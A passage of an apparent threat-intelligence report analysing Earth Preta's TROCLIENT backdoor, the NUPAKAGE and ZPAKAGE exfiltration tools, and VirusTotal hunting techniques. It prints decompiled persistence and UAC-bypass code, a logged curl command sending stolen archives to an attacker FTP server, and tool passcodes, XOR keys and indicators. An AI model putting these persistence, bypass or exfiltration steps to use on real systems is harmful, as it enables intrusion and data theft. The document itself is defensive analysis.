installation of the malware (NetSky.exe) through its persistence mechanisms, which include creating commands to run hidden payloads (free.plg and main.plg). The flowchart details the steps involved in reading and decrypting plugins, checking for specific conditions (like the presence of avp.exe), and injecting code into the dllhost.exe process. The diagram provides a visual representation of the malware's capabilities and operational flow, making it a valuable technical resource for understanding its functionality.\nTranscription: |\n  NetSky.exe\n    └── Sideloads\n        └── RzLog4CPP.dll\n            └── Reads\n                └── alloc.plg\n                    ├── Check arav[1]\n                    ├── install\n                    │   └── Installs itself for persistence with the command \"C:\\ProgramData\\netsky\\netsky.exe online\"\n                    ├── online\n                    │   └── Reads and decrypts free.plg (XXXClient loader) and injects it into the process dllhost.exe\n                    └── passuac\n                        └── Bypasses UAC\n  \n  free.plg\n    └── Injects\n        └── dllhost.exe\n            └── Reads and decrypts\n                └── main.plg\n                    └── Injects\n                        └── Connects to C&C\n                            └── User\n```\n\n*Figure 28. Execution flow of TROCLIENT*\n\nThe arguments of TROCLIENT provide the following capabilities:\n\n- **install.** There are two ways to determine the method of installation for TROCLIENT, detailed here:\n  1. It installs itself by creating a service called InstallSvc which will trigger “*C:\\programdata\\netsky\\netsky.exe online*”.\n  2. It sets up a run key for the command *C:\\programdata\\netsky\\netsky.exe online* for persistence.\n\n- **online:** It will read the next stage payloads, *free.plg* and *main.plg*, and inject them into *dllhost.exe*.\n\n- **passuac:** The malware will check if the process *avp.exe* exists. If it does not, UAC bypass is executed via the CMSTPLUA COM interface. If *avp.exe* exists, UAC bypass is executed via token manipulation.\n\n```image\nAlt: Figure 29. The capabilities of three different arguments\nDescription: The image displays a snippet of code related to the TROCLIENT backdoor, specifically focusing on its installation and execution logic. It includes conditional checks and function calls that determine how the malware installs itself, checks for its online capability, and executes necessary commands for UAC (User Account Control) bypass. The code is written in a programming language, possibly C or C++, and illustrates specific malware behaviors that are critical for understanding its function.\nTranscription: |\n  c\n  if ( v2 == 2 )\n  {\n      if ( !sub_10022AF3(v1[1], L\"install\") )\n      {\n          sub_1001AF90(); // install service\n      }\n      sub_1001AC80();\n  }\n  else if ( sub_10002320() )\n  {\n      sub_1001A4B0(); // shell execute netsky.exe passuac\n  }\n  else\n  {\n      SHSetValueA(\n          HKEY_CURRENT_USER,\n          \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n          \"Appdata\",\n          1u,\n          \"C:\\\\ProgramData\\\\Netsky\\\\NetSky.exe online\",\n          0x27u);\n      sub_1001A2E0();\n  }\n  \n  if ( !sub_10022AF3(v1[1], L\"online\") )\n  {\n      sub_1001A2E0();\n  }\n  if ( !sub_10022AF3(v1[1], L\"passuac\") )\n  {\n      if ( sub_1001A0B0() == -1 )\n      {\n          sub_1001AD90(); // uacbypass_CMSTPLUA\n      }\n      else\n      {\n          v5 = (void (*)(void))VirtualAlloc(0x17BD6u, 0x1000u, 0x40u);\n          sub_1001E1A0(v5, dword_100024D0, 97238); // uac is useless\n          v5();\n      }\n  }\n```\n\n*Figure 29. The capabilities of three different arguments*\n\nThis backdoor provides the following capabilities:\n\n- Read file \n- Delete file \n- Monitor keystrokes and windows \n\nThere are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.\n\n---\n\n### Table 3. Comparison of COOLCLIENT and TROCLIENT\n\n| **Argument/Behaviors**             | **COOLCLIENT** | **TROCLIENT** |\n| ---------------------------------- | -------------- | ------------- |\n| **install**                        |                |               |\n| Creates a service named InstallSvc | ✓              | ✓             |\n| Executes itself with passuac       | ✓              | ✓             |\n| Sets Run Key with “work/online”    | ✓              | ✓             |\n| **passuac**                        |                |               |\n| AppInfo RPC                        | ✓              |               |\n| CMSTPLUA COM                       | ✓              | ✓             |\n| Token manipulation                 |                | ✓             |\n| **work/online**                    |                |               |\n| Send portmap                       | ✓              |               |\n| Connect to C&C                     | ✓              | ✓             |\n| File operations                    | ✓              | ✓             |\n| Keylogging                         | ✓              | ✓             |\n\n---\n\nIn addition to the aforementioned malware, we also found several shellcode loaders for PlugX. Since it is a known malware family, we will not expand on its details in this blog entry.\n\n---\n\n## Exfiltration\n\nBased on our telemetry, we found that Earth Preta used multiple approaches to exfiltrate sensitive data from the victims. For example, in some cases, we observed that WinRAR and curl (or cURL) were leveraged to collect and transfer data to the threat actor’s server. After further investigation, we even found some previously unseen pieces of malware that were used to collect data in a custom-made file format. In the following sections, we share the details of the unique exfiltration toolsets developed by Earth Preta.\n\n### WinRAR and curl\n\nAccording to some of our monitoring logs, the threat actors abused the installed WinRAR binary and the uploaded curl executable to exfiltrate the files (Figure 30 shows the executed command). Note that the executable *log.log* is a legitimate curl binary. All the exfiltrated data was collected and sent back to the threat actor-controlled FTP (File Transfer Protocol) server.\n\n```image\nAlt: Figure 30. Exfiltrate data using WinRAR and curl\nDescription: The image illustrates a command execution flow that depicts the process of exfiltrating data using WinRAR and curl. It includes specific paths of the executed files, timestamps, and command-line arguments associated with the curl command. The visual representation uses color coding to differentiate between various components of the command, indicating the execution of a legitimate curl binary and how data is sent to a remote FTP server. This technical diagram serves to provide insight into the operational tactics of threat actors in the context of data exfiltration.\nTranscription: |\n  2022-06-09 01:38:46\n  C:\\Users\\Public\\Libraries\\TVGameBox\\hpqhvind.exe\n  C:\\Windows\\SysWOW64\\cmd.exe\n  C:\\ProgramData\\IDM\\log.log --progress-bar -C - -T C:\\ProgramData\\IDM\\<redacted>.RAR ftp://<user>:<pass>@<upload_ip>/\n```\n\n*Figure 30. Exfiltrate data using WinRAR and curl*\n\nIn some cases, we accidentally stumbled on the account and password of the FTP server. Upon checking the FTP server, we learned that the threat actors focused on sensitive and confidential documents, most of which were compressed and protected with a password. Based on our observations, the documents were organized via the categorization of the victim’s host name and disk drive.\n\n```image\nAlt: Figure 31. FTP servers with stolen documents\nDescription: The image displays a file directory listing that contains various compressed RAR files. Each entry includes the filename, file size, file type, and the last modified date. The filenames appear to have a mix of alphanumeric characters and some entries are in a different language, possibly indicating that the files may contain sensitive information related to the threat actor's activities. The presence of multiple RAR files suggests a bulk exfiltration of data.\nTranscription: |\n  Filename                   Filesize    Filetype     Last modified\n  ---------------------------------------------------------------\n  ..                         -           -             -\n  [REDACTED]-min-C.rar       3.3 MB      rar-file      乙丑年十二月五日十五时九分47秒\n  [REDACTED]-J0T05BH-d.rar   3.2 MB      rar-file      乙丑年十二月五日十五时一分34秒\n  [REDACTED]-J0T05BH-C.rar   607.1 MB    rar-file      乙丑年十二月五日十五时十二分41秒\n  [REDACTED]-9M48H5I-E.rar   16.7 MB     rar-file      乙丑年十二月五日十二时06分36秒\n  [REDACTED]-9M48H5I-C.rar   263.1 MB    rar-file      乙丑年十二月五日十二时03分16秒\n  [REDACTED]-martinez-C.rar  127.1 MB    rar-file      乙丑年十二月五日十一时53分16秒\n  [REDACTED]-PC08-Z.rar      2.3 MB      rar-file      乙丑年十二月五日十一时46分41秒\n  [REDACTED].rar             774.2 MB    rar-file      乙丑年十二月五日十一时42分53秒\n  [REDACTED]-PC08-c.rar      151.3 MB    rar-file      乙丑年十二月五日十一时31分38秒\n  [REDACTED].rar             1.5 GB      rar-file      乙丑年十二月五日十一时29分58秒\n  [REDACTED]-4NA5SUC-D.rar   38.8 MB     rar-file      乙丑年十二月五日十一时25分41秒\n  [REDACTED]-4NA5SUC-C.rar   46.8 MB     rar-file      乙丑年十二月五日十一时24分09秒\n  [REDACTED]-QVCB11l-c.rar   254.7 MB    rar-file      乙丑年十二月五日十一时23分49秒\n  [REDACTED].rar             1.1 GB      rar-file      乙丑年十二月五日十一时19分48秒\n  [REDACTED].rar             428.1 KB    rar-file      乙丑年十二月五日十一时15分08秒\n```\n\n*Figure 31. FTP servers with stolen documents*\n\n---\n\n### HackTool.Win32.NUPAKAGE\n\nApart from well-known legitimate tools, the threat actors also crafted highly customized tools used for exfiltration. We named this malware “NUPAKAGE,\" a name derived from its unique PDB string, *D:\\Project\\NEW_PACKAGE_FILE\\Release\\NEW_PACKAGE_FILE.pdb*.\n\nThe NUPAKAGE malware needs a unique passcode to be executed, with the exfiltrated data being wrapped in a custom file format. It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms. By default, it only collects documents, including the files with the following extensions:\n\n- .doc \n- .docx \n- .xls \n- .xlsx \n- .ppt \n- .pptx \n- .pdf \n\nIt avoids collecting documents with file names starting with “$” or “~” since these types of documents are usually either temporary files generated by the system or PE files pretending to be decoy documents (as we discussed in the arrival vectors section).\n\nThe usage of this tool is as follows:\n\n```\nmalware.exe passcode start end chunk -s extension_A extension_B …\n```\n\n---\n\n### Table 5. Arguments of the NUPAKAGE malware\n\n| **Argument Name** | **Format** | **Example Value** | **Description**                                                  |\n| ----------------- | ---------- | ----------------- | ---------------------------------------------------------------- |\n| passcode          | String     | comeon            | A unique code to execute it                                      |\n| start             | String     | 2022-01-01        | The start range of the exfiltrated file’s modification timestamp |\n| end               | String     | 2022-12-31        | The end range of the exfiltrated file’s modification timestamp   |\n| chunk             | Integer    | 4096              | Splits the generated data in chunks by the specified size (MB)   |\n| -s                | String     |                   | File extensions to be collected; optional                        |\n\n---\n\nEvery NUPAKAGE malware needs a unique passcode as its first argument to continue execution. As Figure 32 shows, it first checks if the passcode exists. If not, the malware execution procedure will terminate. In our collection, we observed different passcodes in each malware.\n\n```image\nAlt: Figure 32. Passcode check routine in NUPAKAGE\nDescription: The image displays a snippet of programming code related to the NUPAKAGE malware's passcode check routine. It includes conditions checking the number of arguments passed to the program, copying a string to a variable, and comparing the input passcode against a predefined value. The code is likely written in C or a similar language, as indicated by its syntax.\nTranscription: |\n  if ( (unsigned int)argc < 2 )\n      return -1;\n  v4 = argv[1];\n  strcpy(v18, \"comeon\");\n  v5 = strcmp(v4, v18);\n  if ( v5 )\n      v5 = v5 < 0 ? -1 : 1;\n  if ( v5 )\n      return -1;\n```\n\n*Figure 32. Passcode check routine in NUPAKAGE*\n\n---\n\n### Table 4. Passcodes in NUPAKAGE\n\n| **SHA256**                                                       | **Passcode** |\n| ---------------------------------------------------------------- | ------------ |\n| 634977a24e8fb2e3e82a0cddfe8d007375d387415eb131cce74ca03e0e93565f | notebook     |\n| c835577f1ddf66a957dd0f92599f45cb67e7f3ea4e073a98df962fc3d9a3fbe0 | comeon       |\n| 2937580b16e70f82e27cfbc3524c2661340b8814794cc15cb0d534f5312db0e0 | update       |\n| c2f5a12ebaeb39d4861e4c3b35253e68e6d5dc78f8598d74bc85db21aeb504e8 | comeon       |\n\n---\n\nAfter execution, NUPAKAGE will drop two files, *xxx.zip* and *xxx.z*. The file *xxx.zip* is a logging file with a fake ZIP header prepended at offset 0x0 and taking up the first 0x100 bytes. Starting from the offset 0x100, the logging strings are encrypted with a single byte in XOR operations as shown in Figure 33.\n\n```image\nAlt: Figure 33. The original logging file (top), with plain text revealed in the decrypted logging file (bottom)\nDescription: The image displays a hex dump analysis of a ZIP file structure. The upper part of the image shows a hexadecimal representation of the file's binary data, while the lower part contains a structured breakdown of the ZIP file format, including fields such as signature, version, compression method, timestamps, file size, and the name of the file (test.bin). This detailed view aids in understanding the internal format and structure of the ZIP file as it relates to malware analysis.\nTranscription: |\n  00000000  50 4B 03 04 14 00 00 00  08 00 00 00 00 00 00 00  |PK..............|\n  00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n  ...\n  \n  Template Results - ZIP.bt\n  Name                          Value               Start    Size  Color\n  ---------------------------------------------------------------\n  struct ZIPFILECORD record     test.bin            0h       42Bh\n  char  fiSignature[4]          PK♣♥♥               4h       2h\n  ushort fVersion               20                  6h       2h\n  ushort fFlags                 0                   8h       2h\n  enum COMPTYPE fCompression    COMP_DEFLATE (8)    Ah       2h\n  DOSDATE fFileTime             01:30:48            Ah       4h\n  DOSDATE fFileDate             01/07/2021          0h       4h\n  uint fCRC                     BEC4CA13h           1Eh      4h\n  uint fCompressedSize          1029                12h      4h\n  ushort fFileNameLength        8                   14h      2h\n  char  fFileName[8]            test.bin            1Eh      8h\n  uchar fData[1029]             26h                 405h\n```\n\n*Figure 33. The original logging file (top), with plain text revealed in the decrypted logging file (bottom)*\n\nTaking one of the execution results as an example, much of the information of the exfiltrated data is saved, including the original file path, the original file size, and the compressed file size. We believe that the threat actors use it to further track which files have been processed. For security researchers, this logging file also helps reveal how much data is exfiltrated and provides information on the impact scope.\n\n```\n[+] Program ready!\n[+] FILE ORIGINAL PATH: C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\1494870C-9912-C184-4CC9-B401-A53F4D8DE290.pdf\n[+] FILE PATH SIZE: 198\n[+] FILE ORIGINAL SIZE: 186837\n[+] FILE COMPRESSED SIZE: 183734\n[+] FILE ORIGINAL PATH: C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\Click on ‘Change’ to select default PDF handler.pdf\n[+] FILE PATH SIZE: 210\n[+] FILE ORIGINAL SIZE: 186837\n[+] FILE COMPRESSED SIZE: 183734\n...\n<omitted>\n...\n[*] File or folder access denied!\n[*] File or folder access denied!\n[+] All completed!\n```\n\nThe file with a .z extension is a blob of exfiltrated data within a self-defined file format. The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm. After, it stores the encrypted key blob into the first 0x80 bytes of the file with the .z extension. Starting from the offset 0x80, there exists a long array of all the exfiltrated data.\n\nMuch of the information from the exfiltrated files is saved, such as the MD5 hash, the length of the file name, the compressed file size, the original file size, the file name, and the file’s content. To separate the file blobs, it puts a unique byte sequence at the end of each, *55 55 55 55 AA AA AA AA FF FF FF FF 99 99 99 99*.\n\n```image\nAlt: Figure 34. Self-defined format in the file with the .z extension generated by NUPAKAGE\nDescription: The image displays a hex dump, which is a representation of binary data in hexadecimal format. It shows the data structure of a file, likely related to the NUPAKAGE malware discussed in the CTI content. The hex dump is organized in rows, with each row showing the address offset on the left, followed by the hexadecimal values in columns, and a corresponding ASCII representation on the right. The data appears to be color-coded, possibly indicating different types of data or sections within the file.\nTranscription: |\n  0000h:  03  A0  85  5C  7A  6D  7E  2B  3A  9A  82  78  3D  3B  3A  9A\n  0010h:  67  71  A2  89  7C  6B  8E  7D  28  3A  3B  5A  F7  36  3A  3A\n  0020h:  4A  7E  9A  8F  3A  9C  3A  9A  2C  8F  3A  9A  6A  6B  9A  8C\n  0030h:  6B  8E  9A  8C  3A  9C  8E  9A  8F  3A  9A  6C  6D  9A  8D  3A\n  0040h:  6C  8E  9A  8C  3A  9C  8E  9A  8F  3A  9A  6C  6D  9A  8D  3A\n  0050h:  6C  8E  9A  8C  3A  9C  8E  9A  8F  3A  9A  6C  6D  9A  8D  3A\n  ...\n```\n\n*Figure 34. Self-defined format in the file with the .z extension generated by NUPAKAGE*\n\nIt’s also worth mentioning that in the more recent versions of NUPAKAGE, an increasing number of obfuscations are being adopted to thwart static analysis.\n\n```image\nAlt: Figure 35. Junk codes in more recent versions of NUPAKAGE\nDescription: The image displays a section of code that appears to be part of a malware analysis, specifically related to the NUPAKAGE malware. The code includes memory manipulation functions and conditional checks, suggesting it is involved in processing or decrypting data. The context implies this is relevant for understanding the operations performed by the malware, potentially including how it handles arguments and performs XOR operations.\nTranscription: |\n  memcpy_s(byte_422F50, 0x200u, Source, 0x70u);\n  v7 = (((unsigned int)dword_41F300 >> 9) ^ (((unsigned int)dword_41F300 >> 9) - 122958665) - 1217695470);\n  for (i = 0; i < 0x70; ++i)\n  {\n      byte_422F50[i] = 0x4EAu;\n      v8 = ((v8 ^ (v7 ^ 122958665)) ^ (v8 >> 9)) - 1217695470;\n      if ((unsigned int)argc > 5)\n      {\n          v10 = 0;\n          v64 = -279657982;\n          v34 = 0;\n          v65 = -15814;\n          v3 = ((v8 ^ (v9 - 122958665)) ^ (v8 >> 9)) - 1217695470;\n          sub_401000(&v64);\n          sub_401000(&v64 + 3);\n          if (v11)\n              v11 = v11 ? 0 : -1 : 1;\n          if (!v11)\n          {\n              v11 = (((v8 >> 9) - 122958665) ^ (v8 >> 9)) - 1217695470;\n              memset(&subStr, 0, 0x100u);\n              if ((unsigned int)argc > 6)\n          }\n      }\n  }\n```\n\n*Figure 35. Junk codes in more recent versions of NUPAKAGE*\n\n---\n\n### HackTool.Win32.ZPAKAGE\n\nZPAKAGE is another example of custom malware used for packing files; it also works similarly to NUPAKAGE. It also needs a passcode to ensure that it is being used as intended. In the example shown in Figure 36, the passcode is “start”.\n\n```image\nAlt: Figure 36. An example of a ZPAKAGE password\nDescription: The image displays a snippet of source code, showing a function related to the ZPAKAGE malware. The code includes a string copy operation that assigns the value \"start\" to a variable named String2, followed by a conditional statement that checks if the first argument passed to the program matches String2. If the condition is true, it calls the function 'f_packfile_402440()'. This snippet is relevant to the context of password handling in the ZPAKAGE malware.\nTranscription: |\n  c\n  11    strcpy(String2, \"start\");\n  12    if ( ! _strcmp(argv[1], String2) )\n  13        f_packfile_402440();\n```\n\n*Figure 36. An example of a ZPAKAGE password*\n\nZPAKAGE also supports command-line arguments, but it possesses fewer functions than NUPAKAGE. The usage of this tool is shown as follows:\n\n```\nmalware.exe passcode time\n```\n\n---\n\n### Table 6. Arguments supported by ZPAKAGE\n\n| **Argument Name** | **Format** | **Example Value** | **Description**                      |\n| ----------------- | ---------- | ----------------- | ------------------------------------ |\n| *Passcode*        | String     | start             | A unique code in order to execute it |\n| *Time*            | String     | 20221221          | The start date                       |\n\n---\n\nZPAKAGE also shows similar behaviors to NUPAKAGE. For instance, it also avoids files with names starting with “$” or “~”. In addition, it generates two files, one with a .z extension and another with a .zip extension. The file with a .z extension is the exfiltrated data blob and the file with a .zip extension is the logging file.\n\nIn the generated file with a .z extension, the exfiltrated files will be compressed by the zlib algorithm to minimize the file size. It also defines a Boolean field “type” for storage, whether a file is compressed or not. If a file is compressed and its file size is less than the original one, the type will be 1. Otherwise, the type will be set to 0, and the original file content will be chosen instead of the compressed one. Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string, *qwerasdf*.\n\n```image\nAlt: Figure 37. Self-defined format in the file with .z extension generated by ZPAKAGE\nDescription: The image displays a hex dump, which is a representation of binary data in hexadecimal format. It consists of two sections, each showing a series of bytes along with their corresponding offsets, hexadecimal values, and ASCII interpretations on the right side. The data likely represents the internal structure of the files created by the ZPAKAGE tool, specifically focusing on the self-defined format of the .z extension file. The highlighted sections may indicate specific areas of interest or patterns relevant to the topic of data exfiltration.\nTranscription: |\n  Offset    0    1    2    3    4    5    6    7    8    9    A    B    C    D    E    F\n  00000000  25  07  04  12  73  02  00  00  00  00  00  00  00  00  00  00\n  00000010  14  77  12  72  73  16  19  72  72  04  73  73  10  6B  00  00\n  00000020  F5  E9  2F  A4  C4  5E  FF  07  3A  3D  3C  00  00  00  00  00\n  00000030  08  EA  F4  E9  67  E7  73  77  77  77  77  77  77  77  77  77\n  00000040  E9  4C  93  03  64  00  00  00  00  00  00  00  00  00  00  00\n  00000050  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00\n  ...\n```\n\n*Figure 37. Self-defined format in the file with .z extension generated by ZPAKAGE*\n\n---\n\n## Threat hunting\n\nSince October 2022, the threat actors have changed their TTPs and have started using password-protected archives. For example, we found a TONEINS sample (SHA256: *8b98e8669d1ba49b66c07199638ae6012adf7d5d93c1ca3bf31d6329506da58a*) on VirusTotal that can’t be linked to any other file in the “Relations” tab. However, we observed two files that have been opened in the “Behaviors” tab with the file names *~$Evidence information.docx* and *~$List of terrorist personnel at the border.docx*. As mentioned in the arrival vectors section, the next stage payloads are normally embedded in the fake document files.\n\n```image\nAlt: Figure 38. Opened files of TONEINS sample\nDescription: The image is a screenshot of a file system actions log displaying a list of files that were opened during a specific process. Notably, two files are highlighted in red: *~$Evidence information.docx* and *~$List of terrorist personnel at the border.docx*, indicating their significance in the context of the analysis. The file paths show that these documents were accessed through a rundll32 executable, which suggests a potential malicious activity related to the threat discussed in the surrounding CTI content.\nTranscription: |\n  File System Actions\n  \n  Files Opened\n  C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\\\n  C:\\Users\\Virtual\\AppData\\Local\\Temp\\8b98e8669d1ba49b6c67199638ae6012adf7d5d93c1ca3bf31d6329506da58a.dll\n  C:\\Users\\user\\Desktop\\attachment.dll\n  C:\\Users\\user\\Desktop\\attachment.dll.123.Manifest\n  C:\\Users\\user\\Desktop\\attachment.dll.124.Manifest\n  C:\\Users\\user\\Desktop\\rundll32.exe-$Evidence information.docx\n  C:\\Users\\user\\Desktop\\rundll32.exe-$List of terrorist personnel at the border.docx\n  C:\\Windows\\AppPatch\\sysmain.sdb\n```\n\n*Figure 38. Opened files of TONEINS sample*\n\nFigure 39 shows the search results for the query “List of terrorist personnel at the border” on VirusTotal. The first file is the TONEINS DLL sample that we mentioned earlier in this section, while the second file is a benign executable file originally named *adobe_licensing_wf_helper.exe*, which was apparently uploaded to VirusTotal with the file name *List of terrorist personnel at the border.exe*.\n\n```image\nAlt: Figure 39. Search result for the string List of terrorist personnel at the border on VirusTotal\nDescription: The image displays a table from a cybersecurity analysis tool, likely VirusTotal, showing three files associated with a specific malware sample identified by a SHA256 hash. Each row contains important details about the files, including their detection status, size, and timestamps for when they were first and last seen. The first file is marked with multiple detections indicating it contains a backdoor and Trojan, while the other two files show no detections. The filenames suggest they are linked to a malicious operation involving password-protected archives.\nTranscription: |\n  FILES 3 / 3\n  \n  8D98E8669D1BA4966C07199638E261A2DF750D93C13BF31D632956DA58A\n      4ec56dabc187f1e7ccbb3f7d7db37a.virus\n      Detections: 23 / 69\n      Size: 714.00 KB\n      First seen: 2022-11-09 21:21:52\n      Last seen: 2022-11-09 21:21:52\n      Tags: Backdoor_TONESHELL_obfuscation, Trojan_TONEINS_strings, pedll\n  \n  4761183BC8FF9933551916EDA7C348B8F9EAD24C4C195870458B91609A83\n      adobe.licensing_wf_helper.exe\n      Detections: 0 / 72\n      Size: 397.71 KB\n      First seen: 2022-01-11 18:53:10\n      Last seen: 2022-11-09 05:46:07\n      Tags: peexe, runtime-modules, signed, overlay\n  \n  826B3DAC898B53DAB080101920D36252628D290A872FB63C2FF672BE7FE\n      \\Microsoft\\Windows\\INetCache\\IE\\R0IAZP72\\List%20of%20terrorist%20personnel%20at%20the%20border[1].rar\n      Detections: 0 / 60\n      Size: 985.73 KB\n      First seen: 2022-11-09 05:10:18\n      Last seen: 2022-11-09 05:10:18\n      Tags: rar, encrypted\n```\n\n*Figure 39. Search result for the string List of terrorist personnel at the border on VirusTotal*\n\nThe third file is a password-protected archive, which has the exact same file name, *List of terrorist personnel at the border[1].rar*. Unfortunately, we didn’t have the password, so we were unable to decompress it. But it has an interesting execution parent in the “Relations” tab, which is a document file named *Letter Head.docx*.\n\n```image\nAlt: Figure 41. Execution parent of List of terrorist personnel at the border[1].rar\nDescription: The image is a screenshot from VirusTotal displaying detailed information about a file identified as an encrypted RAR archive named 'List of terrorist personnel at the border[1].rar'. It shows a community score of 0, indicating that no security vendors or sandboxes have flagged this file as malicious. The relevant details include the file path, size (985.73 KB), and the execution parent, which is an Office Open XML Document named 'Letter Head.docx'. The information is structured in a table format, clearly delineating various attributes and scan results related to the file.\nTranscription: |\n  0 / 60\n  Community Score\n  \n  No security vendors and no sandboxes flagged this file as malicious\n  \n  826b3daac890853dbadb0810092d36250262b0d9a0782fb632cff0672bee7fe\n  C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\NetCache\\IE\\R0IAZP7ZList%20of%20terrorist%20personnel%20at%20the%20border[1].rar\n  encrypted   rar\n  985.73 KB   2022-11-09 05:10:18 UTC   2 days ago\n  \n  DETECTION\n  Scanned 2022-11-09\n  Detections 0 / 64\n  \n  RELATIONS\n  Execution Parents (1)\n  Type Office Open XML Document\n  Name Letter Head.docx\n```\n\n*Figure 41. Execution parent of List of terrorist personnel at the border[1].rar*\n\nInside the document *Letter Head.docx*, there is a Google Drive link and a password. The content itself is related to the Government of the Republic of the Union of Myanmar and is written in Burmese.\n\n```image\nAlt: Figure 42. Letter Head.docx\nDescription: The image appears to be a document related to the Government of the Republic of the Union of Myanmar. It includes an official emblem at the top and contains text in the Burmese language. The document mentions a Google Drive link for downloading content related to the 'Myanmar Sustainable Development Plan' and indicates an extraction date for passwords. The layout resembles an official government communication, suggesting that it may be used to deceive recipients into accessing malicious content.\nTranscription: |\n  မြန်မာနိုင်ငံ\n  မြန်မာနိုင်ငံ၏\n  အခြေခံအချက်အလက်\n  \n  အမည် - ၆၆၆ မ ၂၀၀ ၁၉၉၁\n  ရက် - ၁၉၉၁ ခုနှစ်\n  \n  အချက်အလက်များ\n  \n  အမျိုးသားစီမံကိန်း\n  မြန်မာနိုင်ငံတိုးတက်ရေး\n  အစီအစဉ် (Myanmar Sustainable Development Plan-MSDP)\n  https://drive.google.com/uc?id=1T9D_qOHd9a-wiKeJL8oWs-8j-WAMGSQ&export=download\n  (Extracting passwords: 09-11-2022)\n```\n\n*Figure 42. Letter Head.docx*\n\nUpon checking the download link, we discovered that it was the same password-protected archive file that we found on VirusTotal earlier.\n\n```image\nAlt: Figure 43. Screenshot of the Google Drive link\nDescription: The image displays a Google Drive interface showing a password-protected RAR file named \"List of terrorist personnel at the border.rar.\" It features a download button and information about the file size (986 KB), creation date, and last modified date. The interface is primarily in Chinese, indicating potential accessibility issues with previewing the file. The file appears to be associated with a threat intelligence context, specifically related to the earlier discussions on the topic of password-protected archives used in attacks.\nTranscription: |\n  List of terrorist personnel at the border.rar\n  \n  無法預覽檔案\n  顯示預覽畫面時發生問題。\n  \n  下載\n  建議使用下列其中一個應用程式開啟或編輯這個項目\n  - CloudConvert\n  - Document Viewer for Google Drive\n  - UnRAR and RAR Viewer\n  \n  一般資訊\n  類型: 壓縮檔\n  大小: 986 KB\n  上次修改日期: 2022年11月9日 中午12:43\n  建立日期: 2022年11月9日 中午12:02\n  我上次開啟的日期: 2022年11月15日 上午10:54\n  \n  共享設定\n  知道連結的任何人\n  可以檢視\n  \n  說明\n  沒有說明\n  \n  下載權限\n  檢視者可以下載\n```\n\n*Figure 43. Screenshot of the Google Drive link*\n\nThe new arrival vector flow is similar to the one we introduced in the arrival vector section: Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email.\n\nAs for why the password-protected archive has the execution parent, upon checking the sandbox execution behaviors of *Letter Head.docx* on VirusTotal, we discovered that the VirusTotal sandbox will select any link embedded in the document. This leads to the opening of an Internet Explorer window with the file download prompt.\n\n```image\nAlt: Figure 44. Sandbox screenshot of the file Letter Head.docx on VirusTotal\nDescription: The image shows a screenshot of a Microsoft Word document titled 'Letter Head' accompanied by a pop-up download prompt for a file named 'List of terrorist personnel at the border.rar.' The prompt indicates that the file is 985 KB and is being downloaded from a Google user content link. The Word document appears to contain text written in Burmese, with a portion of the content obscured by a series of characters. The browser window is empty, indicating a blank page. This screenshot illustrates the download process of a suspected malicious archive file linked to the document.\n```\n\n*Figure 44. Sandbox screenshot of the file Letter Head.docx on VirusTotal*\n\nWhen the download prompt is shown, Internet Explorer will silently download this file in the background even before the user selects the “Save” button.\n\nAs a result, the file will be saved to the cache folder named “INetCache,” after which we see a dropped RAR file:\n\n- *C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\R0IAZP7Z\\List%20of%20terrorist%20personnel%20at%20the%20border[1].rar*\n\nSince the RAR file is downloaded automatically by Internet Explorer, *Letter Head.docx* will be treated as its execution parent. This sample can then be used for hunting this campaign.\n\n```image\nAlt: Figure 45. The dropped files of Letter Head.docx on VirusTotal\nDescription: The image displays a list of files dropped on a Windows system, likely as part of a cyber threat analysis. It highlights the path to a RAR file containing sensitive information, specifically named 'List of terrorist personnel at the border[1].rar', along with its SHA256 hash for identification. Below this, additional file paths are presented, including a shortcut to 'Letter Head.LNK' and other files related to Microsoft Office, indicating the context of the threat and the files involved in the attack.\nTranscription: |\n  Files Dropped\n  - C:\\Users\\user\\AppData\\Local\\Microsoft\\Windows\\NetCache\\E\\R0IAZP7Z\\List%20of%20terrorist%20personnel%20at%20the%20border[1].rar\n    sha256  826b3daac890853dbadb0810092d3625026b2d0d9a0782fb632cff0672bee7fe\n    type    RAR\n  + C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Office\\Recent\\Letter Head.LNK\n  + C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Office\\Recent\\index.dat\n  + C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm (copy)\n  + C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Templates\\~WRD0000.tmp\n```\n\n*Figure 45. The dropped files of Letter Head.docx on VirusTotal*\n\nTo find additional password-protected archives and documents embedded with a Google Drive link, we tried to use the following query:\n\n```\ntag:rar tag:encrypted name:INetCache size:500kb+\n```\n\nThe query finds any encrypted RAR archive with a large enough file size containing the folder name “INetCache” in its path. Fortunately, we found another RAR file with the document execution parent *Notic(20221010)(final).docx* that turned out to be a TONESHELL archive.\n\n```image\nAlt: Figure 46. Relations of the archive file\nDescription: The image displays a detailed report from VirusTotal regarding a file identified as a password-protected RAR archive. It includes information such as the file's community score, size, and the date it was scanned. The report highlights that no security vendors or sandboxes flagged the file as malicious. Additionally, it lists two URLs associated with the file and their scanning results, both showing no detections. Under the 'Execution Parents' section, it indicates that the scanned file has a parent document named 'Notic(20221010)(final).docx', which has been scanned and shows no detections.\nTranscription: |\n  0 / 61\n  ? \n  Community Score\n  2f0bd3ac2ce595420e441358ebc70b0ef9de416cf94a0519e1fd270aef0eb53\n  rar\n  encrypted\n  532.98 KB\n  2022-10-25 07:45:33 UTC\n  3 months ago\n  \n  DETECTION    DETAILS    